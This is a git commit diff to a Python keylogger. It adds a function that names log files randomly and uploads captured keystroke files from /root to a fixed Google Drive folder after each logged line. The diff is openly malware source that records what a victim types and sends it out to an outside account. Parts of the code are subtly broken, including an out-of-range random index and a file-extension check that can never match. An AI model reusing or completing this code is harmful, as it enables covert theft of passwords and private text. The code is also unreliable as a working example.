22e9fe08f4b7212336cd77fb46f8b679928ff115
cazueirobr <matheus.sydor@hotmail.com>
2023-03-23 15:53:55 -0300

    feat: google Drive

--- keylogger.py
+++ keylogger.py
@@ -1,5 +1,35 @@
 import keyboard
 
+def gerar_nome():
+    import datetime
+    import random
+    direita = ('breu','escuro','obscuro','trevas','sombra','caligem', 'neblina', 'blecaute', 'apagao', 'opaco', 'tenebroso')
+    name = datetime.date
+    name = str(name.today())
+
+    return name + '-' + direita[random.randint(0,11)]
+
+arquivo = gerar_nome() + '.txt'
+
+def google_drive():
+    from pydrive.auth import GoogleAuth
+    from pydrive.drive import GoogleDrive
+    import os
+
+    gauth = GoogleAuth()
+    drive = GoogleDrive(gauth)
+
+    folder = '1OvHDaMSzesRWVOC8seuTu7qVLfkmBiu8'
+
+    directory = '/root'
+
+    for f in os.listdir(directory):
+        filename = os.path.join(directory, f)
+        if filename[-3] == 'txt':
+            gfile = drive.CreateFile({'parents': [{'id': folder}], 'title': f})
+            gfile.SetContentFile(filename)
+            gfile.Upload()
+
 while True:
     frase = ''
     teclas = [[],[]]
@@ -25,7 +55,9 @@ while True:
         else:
             frase += letra[0]
 
-    keylog = open("keylogroot.txt", "a")
+    keylog = open(arquivo, "a")
     keylog.write(frase + '\n')
     keylog.close()
+
+    google_drive()
 
